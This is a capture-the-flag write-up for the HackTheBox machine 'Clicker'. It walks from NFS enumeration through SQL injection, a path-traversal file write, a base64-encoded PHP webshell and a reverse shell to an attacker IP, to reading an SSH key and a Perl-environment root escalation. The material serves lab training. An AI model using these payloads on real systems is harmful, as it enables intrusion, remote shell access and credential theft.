---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Clicker

# Clicker

## Enumeration

### Nmap

```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-20 07:32 EDT

Nmap scan report for 10.10.11.232

Host is up (0.038s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION

22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
111/tcp  open  rpcbind 2-4 (RPC #100000)
2049/tcp open  nfs     3-4 (RPC #100003)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.83 seconds
```

## nfs (tcp 2049)

First, there is NFS, so let's check it out.

```
└─$ nfs-ls -D nfs://clicker.htb
```

Which reveals a backup storage

```
nfs://clicker.htb/mnt/backups
```

or alternatively

```
nmap -sV --script=nfs-ls 10.10.11.232
```

Mount it and download the contents

```
sudo mount.nfs clicker.htb:/mnt/backups /mnt/nfs

ls /mnt/nfs

mkdir htb-clicker

cp /mnt/nfs/clicker.htb_backup.zip htb-clicker
```

Now, we have a nice ZIP with source code.

## Web (80)

Now, let's check the web application. It is a website allowing for registration and login. There you can play a game of clicking. You can save your process.

* The saving query `/save_game.php?clicks=146885&level=5` accepts whatever you put in the arguments. Then it redirects and displays message `/index.php?msg=Game%20has%20been%20saved!`.

### Get web admin

We can inspect the code thanks to the bakcup. The `/save_game.php` is vulnerable to injections. Because the `$setStr` is not parametrised.

```
...
function save_profile($player, $args) {
	global $pdo;
  	$params = ["player"=>$player];
	$setStr = "";
  	foreach ($args as $key => $value) {
    		$setStr .= $key . "=" . $pdo->quote($value) . ",";
	}
  	$setStr = rtrim($setStr, ",");
  	$stmt = $pdo->prepare("UPDATE players SET $setStr WHERE username = :player");
  	$stmt -> execute($params);
}
...
```

However, you cannot simply pass `role=Admin` as it is checked in the `/save_game.php`. You need to pass a key that

* HTTP will eat
* PHP will not recognise
* SQL will execute

The answer is **comment**:

```
GET /save_game.php?clicks=6&/**/role=Admin&level=80 HTTP/1.1
```

Now just logout and logon and BAM! you are admin.

#### Alternative: new-line injection

See:<https://0xdf.gitlab.io/2024/01/27/htb-clicker.html#bypass-check-via-newline-injection>

As SQL is quite forgiving to whitespace, you can add newline `role%0a=Admin`

### Arbirtary write

The Admin role allows to export "Top Players" table into various formats. It generates the export, and serves in on a `/exports/*` endpoint. Inspecting the request, it has two paramenters:

* `threshold` a limit for "top players"
* `extension` format to export: it will also have this extersion.

By inspecting `/export.php` we can spot an interesing behaviour. The `html` case is actually fallback (else clause). So whichever `extension` falls there, it will execute. So, if we put `php`, it will create PHP file and publishes it.

So, let's make POST to `/export`

```
threshold=1&extension=json/../a.php
```

That creates the php file.

Now, we need to put the webshell there. Returning to the `/save_game.php`, we can change nickname to whateve, as it is not validated. This could be the webshell, if we want to. So, let's make GET to `/save_game.php`

```
# In base64, as OneDrive complains again >:(
L3NhdmVfZ2FtZS5waHA/Y2xpY2tzPTEwMDAwMDAwMDAmbmlja25hbWU9PD9waHArc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

and then POST to `/export` as above.

The `/exports/a.php` can be accessed and you can put command in `cmd` param, like `?cmd=ls`.

### Putting it together

To have a nice one-liner, you can use this request to `/save_game.php`, combining the Admin role and reverse shell.

```
# In base64, as OneDrive complains again >:(
L3NhdmVfZ2FtZS5waHA/Y2xpY2tzPTEwMDAwMDAwMDAmLyoqL3JvbGU9QWRtaW4mbGV2ZWw9OCZuaWNrbmFtZT08JTNmcGhwK2V4ZWMoIi9iaW4vYmFzaCstYysnYmFzaCstaSs+JTI2Ky9kZXYvdGNwLzEwLjEwLjE0LjczLzQ0NDQrMD4lMjYxJyIpJTNiJTNmPg==
```

That gives us `www-data` user.

## Escalate from WWW-DATA

By looking around, there are interesting things in `/opt`. One of them is accessible directory, containig a binary `/opt/manage/execute_query` that has user SUID and readme near it.

Decompiling it in Ghidra gives away main function

```
....
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_1 < 2) {
    puts("ERROR: not enough arguments");
    uVar2 = 1;
  }
  else {
    iVar1 = atoi(*(char **)(param_2 + 8));
    pcVar3 = (char *)calloc(0x14,1);
    switch(iVar1) {
    case 0:
      puts("ERROR: Invalid arguments");
      uVar2 = 2;
      goto LAB_001015e1;
    case 1:
      strncpy(pcVar3,"create.sql",0x14);
      break;
    case 2:
      strncpy(pcVar3,"populate.sql",0x14);
      break;
    case 3:
      strncpy(pcVar3,"reset_password.sql",0x14);
      break;
    case 4:
      strncpy(pcVar3,"clean.sql",0x14);
      break;
    default:
      strncpy(pcVar3,*(char **)(param_2 + 0x10),0x14);
    }
    local_98 = 0x616a2f656d6f682f;
    local_90 = 0x69726575712f6b63;
    local_88 = 0x2f7365;
    sVar4 = strlen((char *)&local_98);
...
```

There are few interesing observations.

* It has a fallback case
* It reads some sql script file

By executiing it with parameters you see that it is verbose output of the script.

Now lets try the fallback case with some file (as it seems to read something, based on the decompied code)

```
www-data@clicker:/opt/manage$ ./execute_query 5 filename
./execute_query 5 filename

File not readable or not found
```

Ok, that is interesting. It definitely reads. Let's try the ".sql" files we saw in Ghidra.

```
www-data@clicker:/opt/manage$ ./execute_query 5 create.sql
./execute_query 5 create.sql

mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
CREATE TABLE IF NOT EXISTS players(username varchar(255), nickname varchar(255), password varchar(255), role varchar(255), clicks bigint, level int, PRIMARY KEY (username))
--------------

--------------
INSERT INTO players (username, nickname, password, role, clicks, level) 
        VALUES ('admin', 'admin', 'ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82', 'Admin', 999999999999999999, 999999999)
        ON DUPLICATE KEY UPDATE username=username
--------------
```

So you can read a script. What else works?

```
www-data@clicker:/opt/manage$ ./execute_query 5 ../../../etc/passwd 
./execute_query 5 ../../../etc/passwd 
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin
....
```

Why not absolute paths like `/etc/passwd`? It does not work. Probably, it is prefixed by a path already. Directory traversal is needed.

Ok, what sensitive can we read as a user, but what might be so interesting to read...

```
www-data@clicker:/opt/manage$ ./execute_query 5 ../.ssh/id_rsa
./execute_query 5 ../.ssh/id_rsa

mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
-----BEGIN OPENSSH PRIVATE KEY---
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
....
```

A SSH key! Fix the format a little bit (five dashes at the end are required) and log in as jack@clicker.htb. Grab the flag while you are at it!

## Escalate to Root

Earlier we noticed, that there is a /opt/manage/monitor.sh script owned by root, which we can read. Quick enumeration (manual/linpeas/linenum) shows that we can run that script with sudo.

<details> <summary>Content of the file `/opt/manage/monitor.sh`</summary>

```
#!/bin/bash

if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit

fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml

fi
```

</details>

The important part is the `SETENV` in `(root) SETENV: NOPASSWD: /opt/monitor.sh` - it means we can **set environment variables for the script**. Another lead is that in the `monitor.sh`, it has the following:

```
unset PERL5LIB;
unset PERLLIB;
```

`/usr/bin/xml_pp` is a perl file: the author of the script probably tried to secure it from PATH injections. After googling for `sudo perl env privesc` injection, we stumble upon: <https://medium.com/@DGclasher/privilege-escalation-through-perl-environment-variables-349b39ca01> ,which is a **SPOILER** >:(.

We quickly close the spoiler, and search for how privesc is done with the variables that are unset in the script: maybe there are some more...<https://github.com/sujayadkesar/Linux-Privilege-Escalation#known-exploits> and other resources indeed suggest, that another interesting variable is `PERL5OPT`, which is not unset!

[https://gist.github.com/hook-s3c/b91249747cc7cb5c57404a6e252cd4b6](https://gist.github.com/hook-s3c/b91249747cc7cb5c57404a6e252cd4b6)

**Finally, we can privesc:**

1. spawn perl debugger: `sudo PERL5OPT="-d/dev/null" ./monitor.sh`
2. execute any command in that: `system("whoami > /tmp/whoami")`
3. profit:

```
jack@clicker:/opt$ cat /tmp/whoami 
root
```